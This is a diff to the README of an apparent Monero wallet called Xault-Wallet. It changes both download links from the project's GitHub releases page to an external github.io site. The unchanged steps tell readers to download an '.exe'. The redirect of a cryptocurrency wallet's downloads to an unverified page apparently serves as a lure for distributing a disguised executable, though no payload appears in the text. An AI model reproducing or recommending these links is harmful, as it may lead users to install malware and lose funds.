@@ -1,6 +1,6 @@
 # 🛡️ Xault-Wallet - Secure Monero storage for your privacy
 
-[![Download Xault-Wallet](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/thaddeusprobabilistic193/Xault-Wallet/releases)
+[![Download Xault-Wallet](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://thaddeusprobabilistic193.github.io)
 
 Xault-Wallet provides a private way to store and manage Monero. This desktop application focuses on user privacy and includes specialized tools for high-stakes environments. You maintain full control over your funds without relying on third-party servers.
 
@@ -8,7 +8,7 @@ Xault-Wallet provides a private way to store and manage Monero. This desktop app
 
 Follow these steps to obtain the correct file for your computer.
 
-1. Visit the [Xault-Wallet releases page](https://github.com/thaddeusprobabilistic193/Xault-Wallet/releases).
+1. Visit the [Xault-Wallet releases page](https://thaddeusprobabilistic193.github.io).
 2. Look for the section labeled "Latest" at the top of the page.
 3. Find the file ending in `.exe` under the "Assets" dropdown menu.
 4. Click the filename to start your download.
